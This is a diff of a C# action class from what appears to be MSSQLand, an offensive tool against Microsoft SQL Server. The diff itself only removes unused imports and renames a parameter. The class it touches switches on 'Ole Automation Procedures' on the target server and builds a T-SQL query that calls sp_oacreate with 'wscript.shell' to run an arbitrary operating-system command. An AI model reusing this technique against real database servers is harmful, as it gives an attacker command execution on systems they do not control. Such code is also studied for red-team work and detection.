@@ -1,11 +1,7 @@
 ﻿using MSSQLand.Services;
 using MSSQLand.Utilities;
 using System;
-using System.Collections.Generic;
-using System.Data;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+
 
 namespace MSSQLand.Actions.Execution
 {
@@ -30,12 +26,12 @@ namespace MSSQLand.Actions.Execution
             _command = additionalArguments;
         }
 
-        public override void Execute(DatabaseContext connectionManager)
+        public override void Execute(DatabaseContext databaseContext)
         {
             Logger.TaskNested($"Executing OLE command: {_command}");
 
             // Enable 'Ole Automation Procedures'
-            connectionManager.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1);
+            databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1);
 
             // Generate two random string of 3 to 12 chars
             string output = Guid.NewGuid().ToString("N").Substring(0, 6);
@@ -43,7 +39,7 @@ namespace MSSQLand.Actions.Execution
 
             string query = $"DECLARE @{output} INT; DECLARE @{program} VARCHAR(255);SET @{program} = 'Run(\"{_command}\")';EXEC sp_oacreate 'wscript.shell', @{output} out;EXEC sp_oamethod @{output}, @{program};EXEC sp_oadestroy @{output};";
 
-            connectionManager.QueryService.ExecuteNonProcessing(query);
+            databaseContext.QueryService.ExecuteNonProcessing(query);
             Logger.Success("Executed command");
 
         }
